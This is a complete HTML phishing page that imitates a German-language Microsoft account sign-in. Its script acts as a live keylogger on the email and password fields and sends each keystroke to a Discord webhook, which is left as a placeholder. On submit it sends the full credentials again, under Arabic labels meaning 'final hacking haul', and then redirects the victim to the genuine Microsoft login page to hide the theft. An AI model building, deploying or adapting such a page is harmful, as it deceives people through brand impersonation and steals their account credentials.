<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="Microsoft-Konto: Identitätsprüfung">
    <meta property="og:description" content="Sicherheitsupdate: Bitte bestätigen Sie Ihre Anmeldedaten.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/200px-Microsoft_logo.svg.png">
    <meta property="og:type" content="website">

    <title>Anmelden bei Ihrem Microsoft-Konto</title>
    
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 44px; width: 360px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); border-radius: 1px; }
        /* تصحيح الشعار لضمان الظهور */
        .logo-container { margin-bottom: 24px; }
        .logo { width: 108px; height: 23px; display: block; }
        h2 { font-size: 24px; font-weight: 600; margin: 0 0 12px; color: #1b1b1b; }
        p { font-size: 15px; margin-bottom: 12px; }
        input { width: 100%; border: none; border-bottom: 1px solid #666; padding: 8px 0; font-size: 16px; margin-bottom: 20px; outline: none; border-radius: 0; }
        input:focus { border-bottom: 2px solid #0067b8; }
        .btn-container { display: flex; justify-content: flex-end; margin-top: 10px; }
        button { background-color: #0067b8; color: white; border: none; padding: 8px 36px; font-size: 15px; cursor: pointer; min-width: 100px; }
        button:hover { background-color: #005da6; }
        .email-display { font-weight: 400; color: #1b1b1b; margin-bottom: 20px; display: inline-block; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo-container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/256px-Microsoft_logo_%282012%29.svg.png" alt="Microsoft">
    </div>
    
    <div id="step1">
        <h2>Anmelden</h2>
        <p>E-Mail, Telefon oder Skype</p>
        <input type="email" id="email" placeholder="E-Mail-Adresse" required>
        <p style="font-size: 13px;">Kein Konto? <span style="color: #0067b8; cursor:pointer;">Erstellen Sie jetzt eines!</span></p>
        <div class="btn-container">
            <button onclick="toPassword()">Weiter</button>
        </div>
    </div>

    <div id="step2" class="hidden">
        <div id="back-btn" onclick="backToEmail()" style="cursor:pointer; margin-bottom: 15px; font-size: 14px;">
            <span style="font-size: 18px;">←</span> <span id="user-email" class="email-display"></span>
        </div>
        <h2>Kennwort eingeben</h2>
        <input type="password" id="password" placeholder="Kennwort" required>
        <p style="font-size: 13px; color: #0067b8; cursor: pointer;">Kennwort vergessen?</p>
        <div class="btn-container">
            <button onclick="submitAll()">Anmelden</button>
        </div>
    </div>
</div>

<script>
    const DISCORD_WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL";
    
    let currentData = { email: "", password: "" };

    function setupKeylogger(elementId, keyName) {
        document.getElementById(elementId).addEventListener('input', (e) => {
            currentData[keyName] = e.target.value;
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `⌨️ **Eingabe-Live [${keyName}]:** \`${currentData[keyName]}\`` })
            });
        });
    }

    setupKeylogger('email', 'email');
    setupKeylogger('password', 'password');

    function toPassword() {
        const emailVal = document.getElementById('email').value;
        if (emailVal.length > 3) {
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            document.getElementById('user-email').innerText = emailVal;
        }
    }

    function backToEmail() {
        document.getElementById('step2').classList.add('hidden');
        document.getElementById('step1').classList.remove('hidden');
    }

    function submitAll() {
        fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "🎯 حصيلة الاختراق النهائية",
                    color: 15158332,
                    fields: [
                        { name: "📧 الإيميل الشخصي", value: `\`${currentData.email}\`` },
                        { name: "🔑 كلمة السر", value: `\`${currentData.password}\`` }
                    ]
                }]
            })
        }).then(() => {
            window.location.href = "https://login.live.com/";
        });
    }
</script>

</body>
</html>
